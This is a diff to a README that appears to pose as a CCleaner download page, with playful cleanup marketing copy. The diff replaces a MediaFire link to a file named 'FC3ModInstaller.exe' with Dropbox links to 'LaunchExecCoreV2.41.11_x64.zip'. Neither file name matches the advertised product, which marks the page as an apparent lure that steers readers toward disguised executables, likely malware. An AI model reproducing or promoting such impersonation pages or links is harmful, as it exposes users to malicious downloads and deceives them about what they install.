@@ -3,9 +3,10 @@
 > You have 13GB of browser crumbs, 9 startup vampires, and a registry that screams in binary.  
 > **It's time.**
 ---
-<a href="https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file" target="_blank">
-  <img src="https://sdmntpritalynorth.oaiusercontent.com/files/00000000-aa84-6246-8bab-9cf8b7479caa/raw?se=2025-08-02T14%3A11%3A14Z&sp=r&sv=2024-08-04&sr=b&scid=f58f579d-2825-5fa8-b7f8-599527ad8cae&skoid=eb780365-537d-4279-a878-cae64e33aa9c&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-08-02T09%3A01%3A41Z&ske=2025-08-03T09%3A01%3A41Z&sks=b&skv=2024-08-04&sig=I/hU2i4RLpaFb3M8prWNiGHRpQTpcr/yoGAVCUDkfb4%3D" 
-       alt="Download CCleaner" width="240"/>
+## 📥 Download for Windows
+
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+
 </a>
 
 # 🧼 Meet CCleaner — Your PC’s Personal Janitor
@@ -28,7 +29,10 @@
 🧪 Trusted by millions.  
 🪄 Light. Fast. Ruthless (in the best way).  
 
-## ⬇️ [Download CCleaner Portable](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
+## 📥 Download for Windows
+
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+
 
 ---
 
